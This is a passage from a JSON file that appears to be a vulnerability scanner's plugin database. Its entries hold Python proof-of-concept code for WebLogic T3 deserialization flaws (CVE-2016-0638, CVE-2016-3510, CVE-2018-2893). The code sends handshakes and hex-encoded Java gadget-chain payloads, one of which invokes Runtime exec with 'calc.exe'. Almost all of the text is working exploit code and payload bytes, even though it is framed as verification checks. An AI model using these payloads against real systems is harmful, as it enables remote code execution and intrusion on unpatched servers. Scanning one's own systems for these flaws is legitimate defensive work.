\x67\\x69\\x63\\x2e\\x72\\x6a\\x76\\x6d\\x2e\\x43\\x6c\\x61\\x73\\x73\\x54\\x61\\x62\\x6c\\x65\\x45\\x6e\\x74\\x72\\x79\\x2f\\x52\\x65\\x81\\x57\\xf4\\xf9\\xed\\x0c\\x00\\x00\\x78\\x70\\x72\\x00\\x24\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x63\\x6f\\x6d\\x6d\\x6f\\x6e\\x2e\\x69\\x6e\\x74\\x65\\x72\\x6e\\x61\\x6c\\x2e\\x50\\x61\\x63\\x6b\\x61\\x67\\x65\\x49\\x6e\\x66\\x6f\\xe6\\xf7\\x23\\xe7\\xb8\\xae\\x1e\\xc9\\x02\\x00\\x09\\x49\\x00\\x05\\x6d\\x61\\x6a\\x6f\\x72\\x49\\x00\\x05\\x6d\\x69\\x6e\\x6f\\x72\\x49\\x00\\x0b\\x70\\x61\\x74\\x63\\x68\\x55\\x70\\x64\\x61\\x74\\x65\\x49\\x00\\x0c\\x72\\x6f\\x6c\\x6c\\x69\\x6e\\x67\\x50\\x61\\x74\\x63\\x68\\x49\\x00\\x0b\\x73\\x65\\x72\\x76\\x69\\x63\\x65\\x50\\x61\\x63\\x6b\\x5a\\x00\\x0e\\x74\\x65\\x6d\\x70\\x6f\\x72\\x61\\x72\\x79\\x50\\x61\\x74\\x63\\x68\\x4c\\x00\\x09\\x69\\x6d\\x70\\x6c\\x54\\x69\\x74\\x6c\\x65\\x74\\x00\\x12\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x53\\x74\\x72\\x69\\x6e\\x67\\x3b\\x4c\\x00\\x0a\\x69\\x6d\\x70\\x6c\\x56\\x65\\x6e\\x64\\x6f\\x72\\x71\\x00\\x7e\\x00\\x03\\x4c\\x00\\x0b\\x69\\x6d\\x70\\x6c\\x56\\x65\\x72\\x73\\x69\\x6f\\x6e\\x71\\x00\\x7e\\x00\\x03\\x78\\x70\\x77\\x02\\x00\\x00\\x78\\xfe\\x01\\x00\\x00'\npayload=payload+payloadObj.decode('hex')\npayload=payload+'\\xfe\\x01\\x00\\x00\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x1d\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x72\\x6a\\x76\\x6d\\x2e\\x43\\x6c\\x61\\x73\\x73\\x54\\x61\\x62\\x6c\\x65\\x45\\x6e\\x74\\x72\\x79\\x2f\\x52\\x65\\x81\\x57\\xf4\\xf9\\xed\\x0c\\x00\\x00\\x78\\x70\\x72\\x00\\x21\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x63\\x6f\\x6d\\x6d\\x6f\\x6e\\x2e\\x69\\x6e\\x74\\x65\\x72\\x6e\\x61\\x6c\\x2e\\x50\\x65\\x65\\x72\\x49\\x6e\\x66\\x6f\\x58\\x54\\x74\\xf3\\x9b\\xc9\\x08\\xf1\\x02\\x00\\x07\\x49\\x00\\x05\\x6d\\x61\\x6a\\x6f\\x72\\x49\\x00\\x05\\x6d\\x69\\x6e\\x6f\\x72\\x49\\x00\\x0b\\x70\\x61\\x74\\x63\\x68\\x55\\x70\\x64\\x61\\x74\\x65\\x49\\x00\\x0c\\x72\\x6f\\x6c\\x6c\\x69\\x6e\\x67\\x50\\x61\\x74\\x63\\x68\\x49\\x00\\x0b\\x73\\x65\\x72\\x76\\x69\\x63\\x65\\x50\\x61\\x63\\x6b\\x5a\\x00\\x0e\\x74\\x65\\x6d\\x70\\x6f\\x72\\x61\\x72\\x79\\x50\\x61\\x74\\x63\\x68\\x5b\\x00\\x08\\x70\\x61\\x63\\x6b\\x61\\x67\\x65\\x73\\x74\\x00\\x27\\x5b\\x4c\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2f\\x63\\x6f\\x6d\\x6d\\x6f\\x6e\\x2f\\x69\\x6e\\x74\\x65\\x72\\x6e\\x61\\x6c\\x2f\\x50\\x61\\x63\\x6b\\x61\\x67\\x65\\x49\\x6e\\x66\\x6f\\x3b\\x78\\x72\\x00\\x24\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x63\\x6f\\x6d\\x6d\\x6f\\x6e\\x2e\\x69\\x6e\\x74\\x65\\x72\\x6e\\x61\\x6c\\x2e\\x56\\x65\\x72\\x73\\x69\\x6f\\x6e\\x49\\x6e\\x66\\x6f\\x97\\x22\\x45\\x51\\x64\\x52\\x46\\x3e\\x02\\x00\\x03\\x5b\\x00\\x08\\x70\\x61\\x63\\x6b\\x61\\x67\\x65\\x73\\x71\\x00\\x7e\\x00\\x03\\x4c\\x00\\x0e\\x72\\x65\\x6c\\x65\\x61\\x73\\x65\\x56\\x65\\x72\\x73\\x69\\x6f\\x6e\\x74\\x00\\x12\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x53\\x74\\x72\\x69\\x6e\\x67\\x3b\\x5b\\x00\\x12\\x76\\x65\\x72\\x73\\x69\\x6f\\x6e\\x49\\x6e\\x66\\x6f\\x41\\x73\\x42\\x79\\x74\\x65\\x73\\x74\\x00\\x02\\x5b\\x42\\x78\\x72\\x00\\x24\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x63\\x6f\\x6d\\x6d\\x6f\\x6e\\x2e\\x69\\x6e\\x74\\x65\\x72\\x6e\\x61\\x6c\\x2e\\x50\\x61\\x63\\x6b\\x61\\x67\\x65\\x49\\x6e\\x66\\x6f\\xe6\\xf7\\x23\\xe7\\xb8\\xae\\x1e\\xc9\\x02\\x00\\x09\\x49\\x00\\x05\\x6d\\x61\\x6a\\x6f\\x72\\x49\\x00\\x05\\x6d\\x69\\x6e\\x6f\\x72\\x49\\x00\\x0b\\x70\\x61\\x74\\x63\\x68\\x55\\x70\\x64\\x61\\x74\\x65\\x49\\x00\\x0c\\x72\\x6f\\x6c\\x6c\\x69\\x6e\\x67\\x50\\x61\\x74\\x63\\x68\\x49\\x00\\x0b\\x73\\x65\\x72\\x76\\x69\\x63\\x65\\x50\\x61\\x63\\x6b\\x5a\\x00\\x0e\\x74\\x65\\x6d\\x70\\x6f\\x72\\x61\\x72\\x79\\x50\\x61\\x74\\x63\\x68\\x4c\\x00\\x09\\x69\\x6d\\x70\\x6c\\x54\\x69\\x74\\x6c\\x65\\x71\\x00\\x7e\\x00\\x05\\x4c\\x00\\x0a\\x69\\x6d\\x70\\x6c\\x56\\x65\\x6e\\x64\\x6f\\x72\\x71\\x00\\x7e\\x00\\x05\\x4c\\x00\\x0b\\x69\\x6d\\x70\\x6c\\x56\\x65\\x72\\x73\\x69\\x6f\\x6e\\x71\\x00\\x7e\\x00\\x05\\x78\\x70\\x77\\x02\\x00\\x00\\x78\\xfe\\x00\\xff\\xfe\\x01\\x00\\x00\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x13\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x72\\x6a\\x76\\x6d\\x2e\\x4a\\x56\\x4d\\x49\\x44\\xdc\\x49\\xc2\\x3e\\xde\\x12\\x1e\\x2a\\x0c\\x00\\x00\\x78\\x70\\x77\\x46\\x21\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x09\\x31\\x32\\x37\\x2e\\x30\\x2e\\x31\\x2e\\x31\\x00\\x0b\\x75\\x73\\x2d\\x6c\\x2d\\x62\\x72\\x65\\x65\\x6e\\x73\\xa5\\x3c\\xaf\\xf1\\x00\\x00\\x00\\x07\\x00\\x00\\x1b\\x59\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x00\\x78\\xfe\\x01\\x00\\x00\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x13\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x72\\x6a\\x76\\x6d\\x2e\\x4a\\x56\\x4d\\x49\\x44\\xdc\\x49\\xc2\\x3e\\xde\\x12\\x1e\\x2a\\x0c\\x00\\x00\\x78\\x70\\x77\\x1d\\x01\\x81\\x40\\x12\\x81\\x34\\xbf\\x42\\x76\\x00\\x09\\x31\\x32\\x37\\x2e\\x30\\x2e\\x31\\x2e\\x31\\xa5\\x3c\\xaf\\xf1\\x00\\x00\\x00\\x00\\x00\\x78'\n\n# adjust header for appropriate message length\npayload=struct.pack('>I',len(payload)) + payload[4:]\n\nprint '[+] Sending payload...'\nsock.send(payload)\ndata = sock.recv(1024)\nprint >>sys.stderr, 'received \"%s\"' % data",
            "sysname": "weblogic",
            "param": "ip:port",
            "level": "high",
            "extfile": ""
        },
        {
            "vulname": "weblogic_wls_deserialize2",
            "description": "Weblogic WLS核心组件反序列化漏洞(CVE-2016-0638)",
            "poc": "def _verify(host, port, vulns):\n    defaultport = 7001\n    pocdict = {\n        \"vulnname\":\"weblogic_wls_deserialize2\",\n        \"isvul\": False,\n        \"vulnhost\":host,\n        \"vulnport\":port,\n        \"payload\":\"\",\n        \"proof\":\"\",\n        \"response\":\"\",\n        \"exception\":\"\",\n    }\n    port = int(port)\n    try:\n        index = 0\n        PAYLOAD = ['aced0005737200257765626c6f6769632e6a6d732e636f6d6d6f6e2e53747265616d4d657373616765496d706c6b88de4d93cbd45d0c00007872001f7765626c6f6769632e6a6d732e636f6d6d6f6e2e4d657373616765496d706c69126161d04df1420c000078707a000003f728200000000000000100000578aced00057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4f626a6563743b7870737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b0200007870000000014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707371007e00007372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4f626a6563743b7870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001e00000002767200106a61767a0000018e612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001e7371007e00167571007e001b00000002707571007e001b00000000740006696e766f6b657571007e001e00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e001b7371007e0016757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000863616c632e657865740004657865637571007e001e0000000171007e00237371007e0011737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f40000000000010770800000010000000007878767200126a6176612e6c616e672e4f766572726964650000000000000000000000787071007e003a78']\n        VER_SIG = ['weblogic.jms.common.StreamMessageImpl']\n\n        def t3handshake(sock, server_addr):\n            sock.connect(server_addr)\n            sock.send(binascii.unhexlify('74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'))\n            time.sleep(1)\n            sock.recv(1024)\n\n        def buildT3RequestObject(sock, port):\n            data1 = '000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371'\n            data2 = '007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000{0}ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07'.format(\n                '{:04x}'.format(port))\n            data3 = '1a7727000d3234322e323134'\n            data4 = '2e312e32353461863d1d0000000078'\n            for d in [data1, data2, data3, data4]:\n                sock.send(binascii.unhexlify(d))\n            time.sleep(2)\n            print(' ...接收长度: {0}'.format(len(sock.recv(2048))))\n\n        def sendEvilObjData(sock, data):\n            payload = '056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000'\n            payload += data\n            payload += 'fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff'\n            payload = '{0:08x}{1}'.format(int(len(payload)/2 + 4), payload)\n            sock.send(binascii.unhexlify(payload))\n            time.sleep(2)\n            sock.send(binascii.unhexlify(payload))\n            res = ''\n            try:\n                while True:\n                    res = sock.recv(4096).decode('utf-8', 'ignore')\n                    time.sleep(0.1)\n                    if re.findall(VER_SIG[index], res, re.S):\n                        break\n            except Exception as e:\n                pass\n            return res\n\n        socket.setdefaulttimeout(30)\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        server_addr = (host, port)\n        print('[+][{0}]发送t3握手包'.format(host))\n        t3handshake(sock, server_addr)\n        print('[+][{0}]建立t3请求对象'.format(host))\n        buildT3RequestObject(sock, port)\n        print('[+][{0}]发送恶意请求包'.format(host))\n        rs = sendEvilObjData(sock, PAYLOAD[index])\n        m = re.findall(VER_SIG[index], rs, re.S)\n        if len(m) > 0:\n            pocdict['isvul'] = True\n            pocdict['payload'] = str(binascii.unhexlify(PAYLOAD[0]))\n            pocdict['proof'] = m\n            pocdict['response'] = str(rs)\n\n    except Exception as e:\n        pocdict['exception'] = str(e)\n    vulns.append(pocdict)\n_verify(self.host, self.port, self.vulns)",
            "exp": "",
            "sysname": "weblogic",
            "param": "ip:port",
            "level": "high",
            "extfile": ""
        },
        {
            "vulname": "weblogic_wls_deserialize3",
            "description": "Weblogic WLS核心组件反序列化漏洞(CVE-2016-3510)",
            "poc": "def _verify(host, port, vulns):\n    defaultport = 7001\n    pocdict = {\n        \"vulnname\":\"weblogic_wls_deserialize3\",\n        \"isvul\": False,\n        \"vulnhost\":host,\n        \"vulnport\":port,\n        \"payload\":\"\",\n        \"proof\":\"\",\n        \"response\":\"\",\n        \"exception\":\"\",\n    }\n    port = int(port)\n    try:\n        index = 0\n        PAYLOAD = [\n            'aced0005737200257765626c6f6769632e636f7262612e7574696c732e4d61727368616c6c65644f626a656374592161d5f3d1dbb6020002490004686173685b00086f626a42797465737400025b427870b6f794cf757200025b42acf317f8060854e0020000787000000130aced00057372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000074000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a99020000787000000001767200106a6176612e6c616e672e53797374656d00000000000000000000007870',\n            ]\n        VER_SIG = ['org.apache.commons.collections.functors.InvokerTransformer']\n\n        def t3handshake(sock, server_addr):\n            sock.connect(server_addr)\n            sock.send(binascii.unhexlify('74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'))\n            time.sleep(1)\n            sock.recv(1024)\n\n        def buildT3RequestObject(sock, port):\n            data1 = '000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371'\n            data2 = '007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000{0}ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07'.format(\n                '{:04x}'.format(port))\n            data3 = '1a7727000d3234322e323134'\n            data4 = '2e312e32353461863d1d0000000078'\n            for d in [data1, data2, data3, data4]:\n                sock.send(binascii.unhexlify(d))\n            time.sleep(2)\n            print(' ...接收长度: {0}'.format(len(sock.recv(2048))))\n\n        def sendEvilObjData(sock, data):\n            payload = '056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000'\n            payload += data\n            payload += 'fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff'\n            payload = '{0:08x}{1}'.format(int(len(payload)/2 + 4), payload)\n            sock.send(binascii.unhexlify(payload))\n            time.sleep(2)\n            sock.send(binascii.unhexlify(payload))\n            res = ''\n            try:\n                while True:\n                    res = sock.recv(4096).decode('utf-8', 'ignore')\n                    time.sleep(0.1)\n                    if re.findall(VER_SIG[index], res, re.S):\n                        break\n            except Exception as e:\n                pass\n            return res\n\n        socket.setdefaulttimeout(30)\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        server_addr = (host, port)\n        print('[+][{0}]发送t3握手包'.format(host))\n        t3handshake(sock, server_addr)\n        print('[+][{0}]建立t3请求对象'.format(host))\n        buildT3RequestObject(sock, port)\n        print('[+][{0}]发送恶意请求包'.format(host))\n        rs = sendEvilObjData(sock, PAYLOAD[index])\n        m = re.findall(VER_SIG[index], rs, re.S)\n        if len(m) > 0:\n            pocdict['isvul'] = True\n            pocdict['payload'] = str(binascii.unhexlify(PAYLOAD[0]))\n            pocdict['proof'] = m\n            pocdict['response'] = str(rs)\n\n    except Exception as e:\n        pocdict['exception'] = str(e)\n    vulns.append(pocdict)\n_verify(self.host, self.port, self.vulns)",
            "exp": "",
            "sysname": "weblogic",
            "param": "ip:port",
            "level": "high",
            "extfile": ""
        },
        {
            "vulname": "weblogic_wls_deserialize4",
            "description": "Weblogic WLS核心组件反序列化漏洞(CVE-2018-2893)",
            "poc": "def _verify(host, port, vulns):\n    defaultport = 7001\n    pocdict = {\n        \"vulnname\":\"weblogic_wls_deserialize4\",\n        \"isvul\": False,\n        \"vulnhost\":host,\n        \"vulnport\":port,\n        \"payload\":\"\",\n        \"proof\":\"\",\n        \"response\":\"\",\n        \"exception\":\"\",\n    }\n    port = int(port)\n    try:\n        index = 0\n        PAYLOAD = ['ACED0005737200257765626C6F6769632E6A6D732E636F6D6D6F6E2E53747265616D4D657373616765496D706C6B88DE4D93CBD45D0C00007872001F7765626C6F6769632E6A6D732E636F6D6D6F6E2E4D657373616765496D706C69126161D04DF1420C000078707A000001251E200000000000000100000118ACED0005737D00000001001A6A6176612E726D692E72656769737472792E5265676973747279787200176A6176612E6C616E672E7265666C6563742E50726F7879E127DA20CC1043CB0200014C0001687400254C6A6176612F6C616E672F7265666C6563742F496E766F636174696F6E48616E646C65723B78707372002D6A6176612E726D692E7365727665722E52656D6F74654F626A656374496E766F636174696F6E48616E646C657200000000000000020200007872001C6A6176612E726D692E7365727665722E52656D6F74654F626A656374D361B4910C61331E03000078707732000A556E696361737452656600093132372E302E302E310000F1440000000046911FD80000000000000000000000000000007878']\n        VER_SIG = ['StreamMessageImpl']\n\n        def t3handshake(sock, server_addr):\n            sock.connect(server_addr)\n            sock.send(binascii.unhexlify('74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'))\n            time.sleep(1)\n            sock.recv(1024)\n\n        def buildT3RequestObject(sock, port):\n            data1 = '000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e